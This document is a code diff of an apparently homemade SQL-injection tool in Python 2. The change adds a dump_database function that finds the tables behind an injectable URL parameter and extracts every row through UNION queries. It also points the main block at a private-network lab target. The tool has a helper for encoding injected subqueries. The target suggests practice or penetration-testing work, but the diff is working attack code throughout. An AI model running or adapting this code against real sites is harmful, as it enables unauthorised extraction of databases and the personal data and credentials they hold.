@@ -144,10 +144,46 @@ def dump_table(page, table, num_cols, visible_num, verbose):
 
     results = {}
 
+    num_rows = 0
     for column in columns(page, table, num_cols, visible_num, False):
-        results[column] = rows(page, table, column, num_cols, visible_num, False)
+        r = rows(page, table, column, num_cols, visible_num, False)
+        if len(r) > num_rows:
+            num_rows = len(r)
+        results[column] = r
+
+    if verbose:
+        print 'Table:', table
+
+        for r in results:
+            print r, '\t',
+        print 
+
+        for i in xrange(0, num_rows):
+            for r in results:
+                try:
+                    print results[r][i],
+                except IndexError:
+                    print 'XXX',
 
     return results
+
+def dump_database(page, num_cols, visible_num, verbose):
+    """ Dumps all database info for a vulnerable page.
+        :page:          String. Valid URL for vulnerable page.
+        :num_cols:      Int. Number of columns in UNION statement.
+        :visible_num:   Int. Number of most visible column in UNION statment.
+        :verbose:       Bool. Whether to print additional info or not.
+        :returns:       Dict of dict of lists. 1st key is table names.
+                        2nd key is column names->list containing rows of data.
+    """
+
+    results = {}
+    t = tables(page, num_cols, visible_num, False)
+    for table in t:
+        results[table] = dump_table(page, table, num_cols, visible_num, verbose)
+
+    return results
+
 
 def obfuscate_subquery(obfuscator, obfuscation, subquery):
     """ Takes subquery to obfuscate by encoding.
@@ -215,17 +251,14 @@ if __name__ == '__main__':
     #    page = page[:-1] + "'" + page[-1]
 
     
-    page = 'http://192.168.83.134/index.php?id=1'
-    #page = 'http://192.168.83.130/cat.php?id=1'
+    #page = 'http://192.168.83.134/index.php?id=1'
+    page = 'http://192.168.83.130/cat.php?id=1'
 
     # Get number of columns and which column to use for injection.
     num_cols = num_columns(page, False)
     visible_num = int(visible_nums(page, num_cols, False)[0])
 
-    tables = tables(page, num_cols, visible_num, False)
-    for table in tables:
-        dump_table(page, table, num_cols, visible_num, True):
-
+    dump_database(page, num_cols, visible_num, True)
 
     """
     x = build.comparative_precomputation()
